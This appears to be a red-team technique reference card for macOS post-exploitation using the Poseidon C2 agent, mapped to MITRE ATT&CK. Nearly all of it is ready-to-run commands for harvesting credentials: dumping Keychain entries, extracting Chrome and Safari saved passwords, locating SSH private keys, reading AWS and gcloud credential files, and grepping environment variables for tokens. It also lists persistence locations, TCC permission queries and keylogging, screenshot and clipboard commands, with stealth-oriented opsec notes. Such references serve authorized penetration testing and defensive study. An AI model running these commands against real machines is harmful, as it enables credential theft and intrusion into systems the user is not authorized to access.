---
name: macOS Post-Exploitation Tradecraft
category: discovery
subcategories: [macos-sa, macos-privesc, macos-credentials, macos-lateral]
tradecraft_tags: [macos, osx, poseidon, keychain, tcc, launchd, osascript, technique]
mitre_attack:
  - id: T1555.001
    name: Credentials from Password Stores — Keychain
  - id: T1518.001
    name: Software Discovery — Security Software Discovery
source:
  url: https://attack.mitre.org/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [macos]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  macOS has robust built-in security: TCC (Transparency, Consent and Control) database
  controls access to sensitive resources. Keychain access prompts users. MDM-enrolled
  systems may have additional monitoring. Endpoint Security Framework (ESF) enables
  security products to monitor all syscalls. CrowdStrike Falcon and SentinelOne have
  strong macOS coverage.
usage_examples:
  - description: List installed applications
    args: "ls /Applications/; ls ~/Applications/"
  - description: Find interesting files in user directories
    args: "find ~/Library ~/Documents ~/Desktop -name '*.key' -o -name '*.pem' -o -name 'password*' 2>/dev/null"
  - description: Query Keychain for saved passwords (triggers user prompt)
    args: "security find-generic-password -wa 'service_name'"
  - description: Dump Chrome saved passwords (requires user session)
    args: "strings ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data | grep http"
  - description: Read bash/zsh history
    args: "cat ~/.bash_history; cat ~/.zsh_history"
  - description: List LaunchAgents and LaunchDaemons (persistence locations)
    args: "ls ~/Library/LaunchAgents/; ls /Library/LaunchAgents/; ls /Library/LaunchDaemons/"
  - description: Check for MDM enrollment
    args: "profiles status -type enrollment 2>/dev/null"
  - description: Screenshot current screen (requires screen recording permission)
    args: "(Poseidon) screenshot"
opsec_notes: |
  macOS has significantly stronger security than Windows by default:
  - TCC prevents access to camera, microphone, screen recording, files without user consent
  - Gatekeeper verifies application signatures
  - SIP (System Integrity Protection) prevents modification of /System, /usr, /sbin
  - Keychain access prompts for administrator password or user approval
  The most stealthy macOS tradecraft reuses existing application permissions
  rather than requesting new ones.
gotchas: |
  This is a TECHNIQUE REFERENCE for Poseidon shell commands on macOS. macOS TCC database
  is at ~/Library/Application Support/com.apple.TCC/TCC.db — check it to understand what
  apps have what permissions (requires admin to read in some cases). Keychain credentials
  require user interaction unless specific conditions are met (macOS keychain prompts
  the user for many access types). macOS 12+ has additional restrictions; test in target
  OS version.
related_ttps: [poseidon, linux-credential-hunting, sharpcloud]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# macOS Post-Exploitation Tradecraft

Reference for post-foothold operations on macOS targets via Poseidon. macOS has
stronger security defaults than Windows, but misconfigured apps, user habits, and
Keychain material provide credential access paths.

## Initial Host Profiling

```bash
# OS version and hardware:
sw_vers; system_profiler SPHardwareDataType | grep -E 'Model|Serial|CPU|Memory'

# Current user and groups:
id; groups; dscl . -read /Users/$USER

# Security features:
csrutil status          # SIP status
spctl --status          # Gatekeeper status
fdesetup status         # FileVault status
profiles status -type enrollment 2>/dev/null   # MDM enrollment

# Running processes:
ps aux | grep -v "^nobody"

# Network:
netstat -an | grep LISTEN
ifconfig | grep "inet "
```

## Credential Hunting

### Keychain (highest value)

```bash
# List all keychain entries:
security list-keychains
security dump-keychain -d login.keychain-db 2>/dev/null  # May prompt user

# Find specific service:
security find-generic-password -wa 'WiFi_SSID'          # WiFi password
security find-internet-password -ws 'github.com'        # GitHub password
security find-internet-password -wa 'github.com'        # Full details
```

### Browser Credentials

```bash
# Chrome (SQLite database):
cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data /tmp/ld.db
sqlite3 /tmp/ld.db "SELECT origin_url,username_value,password_value FROM logins"
# (passwords are AES-encrypted with Keychain key — requires decryption)

# Safari (plist):
plutil -p ~/Library/Preferences/com.apple.SafariPasswordManager.plist 2>/dev/null
```

### SSH Keys and Config

```bash
ls -la ~/.ssh/
cat ~/.ssh/config
cat ~/.ssh/known_hosts
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

### Environment and History

```bash
cat ~/.bash_history; cat ~/.zsh_history
env | grep -i "pass\|secret\|token\|key\|api"
cat ~/.aws/credentials 2>/dev/null  # AWS credentials
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null
```

## Persistence Locations

```bash
# LaunchAgents (user persistence, no root needed):
ls ~/Library/LaunchAgents/

# System LaunchAgents/Daemons (require root):
ls /Library/LaunchAgents/
ls /Library/LaunchDaemons/

# Login Items:
osascript -e 'tell application "System Events" to get the name of every login item'

# Cron (deprecated on macOS but sometimes used):
crontab -l
```

## TCC Database (Permission State)

```bash
# What apps have which permissions (requires admin):
sudo sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client,service,allowed FROM access"
# Also check /Library/Application Support/com.apple.TCC/TCC.db for system-level
```

## Poseidon Commands for macOS

```
Poseidon screenshot     → capture screen (if permission granted)
Poseidon keylog 30      → keylog for 30 seconds (X11 equivalent; macOS uses different method)
Poseidon clipboard      → read clipboard contents
Poseidon shell: ...     → all shell commands above
```
